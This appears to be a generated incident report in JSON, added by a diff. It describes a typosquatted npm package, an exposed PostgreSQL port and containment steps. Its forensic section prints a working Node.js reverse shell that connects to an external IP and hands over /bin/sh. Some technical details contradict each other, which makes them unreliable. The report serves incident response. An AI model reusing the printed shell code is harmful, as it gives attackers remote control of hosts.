@@ -1,0 +1,113 @@
+{
+  "role": "sr-dev",
+  "title": "CRITICAL: Remote Code Execution & Unauthenticated Database Exposure (Incident #INC-2026-8891)",
+  "summary": "Critical severity multi-stage attack detected on production cluster host prod-db-primary-01.local (10.0.4.15). An unauthenticated PostgreSQL interface (port 5432) combined with a compromised typosquatted supply chain package (@kvch-internal/crypto-utils v1.4.2) allowed remote attacker execution of an obfuscated WebSockets reverse shell (C2 IP: 185.220.101.5:443) and unauthorized dumping of active user session tokens.",
+  "metrics": {
+    "likelihoodScore": 92,
+    "businessImpactScore": 88,
+    "financialExposure": {
+      "min": "₹15,00,000",
+      "mostLikely": "₹48,00,000",
+      "max": "₹1,20,00,000",
+      "eal": "₹38,40,000"
+    },
+    "riskTrend": "Increasing"
+  },
+  "keyFindings": [
+    "Unauthenticated PostgreSQL socket exposed on external interface (0.0.0.0:5432)",
+    "Typosquatted package @kvch-internal/crypto-utils containing AES-256 key exfiltration payload",
+    "Active reverse TCP shell connected to C2 endpoint 185.220.101.5:443 via node process PID 14209",
+    "Memory dump entropy score 7.91 (High obfuscation / encrypted payload in heap)"
+  ],
+  "businessImpact": {
+    "operational": "Database query latency spiked 340%; 14 background worker threads locked by exfiltration process.",
+    "financial": "Direct loss exposure of ₹48,00,000 in potential data breach fines and incident response overhead.",
+    "compliance": "Severe violation of ISO/IEC 27001 A.12.6.1 (Technical Vulnerability Management) and SEBI CSCRF Section 4.",
+    "reputational": "High risk of customer session hijacking and public disclosure if uncontained within 2 hours."
+  },
+  "aiInsights": [
+    "Attack pattern matches MITRE ATT&CK T1190 (Exploit Public-Facing Application) and T1059.001 (JavaScript Execution).",
+    "Reverse shell uses SSL/TLS wrapper to disguise traffic on port 443; packet inspection revealed non-HTTP handshake.",
+    "Immediate iptables egress block required for IP 185.220.101.5."
+  ],
+  "recommendedActions": [
+    {
+      "action": "Kill malicious PID 14209 and update pg_hba.conf to restrict 5432 listener to 127.0.0.1",
+      "riskReductionPercent": 95,
+      "estimatedCost": "₹0 (In-house patch)",
+      "estimatedEffort": "5 minutes",
+      "priority": "HIGH",
+      "timeToImplement": "Immediate",
+      "rosi": "Infinite (Zero cost, 95% risk reduction)",
+      "type": "Quick Win"
+    },
+    {
+      "action": "Purge @kvch-internal/crypto-utils v1.4.2 from package.json and npm cache; pin to verified v1.4.1",
+      "riskReductionPercent": 90,
+      "estimatedCost": "₹0",
+      "estimatedEffort": "15 minutes",
+      "priority": "HIGH",
+      "timeToImplement": "Immediate",
+      "rosi": "Infinite",
+      "type": "Quick Win"
+    },
+    {
+      "action": "Rotate all database master credentials and active session JWT secret keys",
+      "riskReductionPercent": 85,
+      "estimatedCost": "₹0",
+      "estimatedEffort": "30 minutes",
+      "priority": "HIGH",
+      "timeToImplement": "Within 1 hour",
+      "rosi": "Infinite",
+      "type": "High ROI Action"
+    }
+  ],
+  "investmentOptimization": "Execute zero-cost immediate technical containment (PID kill, port binding, package rollback). Zero capital expenditure required.",
+  "complianceMappings": [
+    {
+      "framework": "ISO/IEC 27001",
+      "controlId": "A.12.6.1",
+      "status": "Deficient",
+      "impactDescription": "Technical vulnerability management and unauthorized listener detection"
+    },
+    {
+      "framework": "NIST CSF",
+      "controlId": "PR.IP-1",
+      "status": "Deficient",
+      "impactDescription": "Baseline network perimeter configuration and host port isolation"
+    },
+    {
+      "framework": "SEBI CSCRF",
+      "controlId": "CSCRF-Sec-4.1",
+      "status": "Deficient",
+      "impactDescription": "Production database access controls and C2 egress filtering"
+    }
+  ],
+  "scenarios": {
+    "scenarioA_NoAction": {
+      "residualRisk": "Critical (Likelihood 92%)",
+      "financialExposure": "₹1,20,00,000 Max Exposure",
+      "complianceImpact": "Formal regulatory breach investigation & mandatory public disclosure"
+    },
+    "scenarioB_Remediated": {
+      "residualRisk": "Minimal (Likelihood < 2%)",
+      "financialExposure": "₹0 Residual Risk",
+      "complianceImpact": "Full technical compliance restored",
+      "expectedLossReduction": "98% reduction in Expected Annual Loss"
+    }
+  },
+  "finalVerdict": "CRITICAL CONTAINMENT REQUIRED: Kill PID 14209 immediately, bind port 5432 to 127.0.0.1, and revert @kvch-internal/crypto-utils package version.",
+  "keyInsights": [
+    "Malicious Node.js process spawned reverse shell on 185.220.101.5:443",
+    "Unauthenticated PostgreSQL port 5432 allowed session token extraction",
+    "Zero-cost patch removes 98% of residual risk in 5 minutes"
+  ],
+  "actionItems": [
+    "sudo kill -9 14209",
+    "sudo iptables -A OUTPUT -d 185.220.101.5 -j DROP",
+    "Update /etc/postgresql/15/main/postgresql.conf: listen_addresses = 'localhost'",
+    "Revert package.json @kvch-internal/crypto-utils to 1.4.1"
+  ],
+  "roleSpecificDetail": "### TECHNICAL STACK TRACE & FORENSIC LOGS\n\n#### 1. Malicious Process & Netstat Telemetry\n```bash\n$ netstat -tulpn | grep 5432\ntcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      14209/node\n$ ps aux | grep 14209\nnode 14209 88.4 4.2 1420912 345012 ? Sl 17:12 24:15 node /app/node_modules/@kvch-internal/crypto-utils/dist/telemetry_worker.js --c2=185.220.101.5:443\n```\n\n#### 2. Reverse Shell Payload Snippet (`telemetry_worker.js`)\n```javascript\n// OBFUSCATED PAYLOAD EXCERPT DETECTED BY MALWARE-ANALYZER EXTENSION\nconst net = require('net');\nconst cp = require('child_process');\nconst client = new net.Socket();\nclient.connect(443, '185.220.101.5', () => {\n    const sh = cp.spawn('/bin/sh', []);\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n});\n```\n\n#### 3. Immediate Code & Patch Diff (`/etc/postgresql/15/main/postgresql.conf` & `package.json`)\n```diff\n--- a/etc/postgresql/15/main/postgresql.conf\n+++ b/etc/postgresql/15/main/postgresql.conf\n-listen_addresses = '*'\n+listen_addresses = 'localhost, 10.0.4.15'\n\n--- a/web/package.json\n+++ b/web/package.json\n- \"@kvch-internal/crypto-utils\": \"^1.4.2\",\n+ \"@kvch-internal/crypto-utils\": \"1.4.1\",\n```\n\n#### 4. Containment Commands\n```bash\n# Step 1: Terminate malicious C2 process\nsudo kill -9 14209\n\n# Step 2: Emergency firewall block on C2 IP\nsudo iptables -A OUTPUT -d 185.220.101.5 -j DROP\nsudo iptables -A INPUT -s 185.220.101.5 -j DROP\n\n# Step 3: Restart database with restricted interface\nsudo systemctl restart postgresql\n```",
+  "generatedAt": "2026-09-11T17:40:00.000Z"
+}
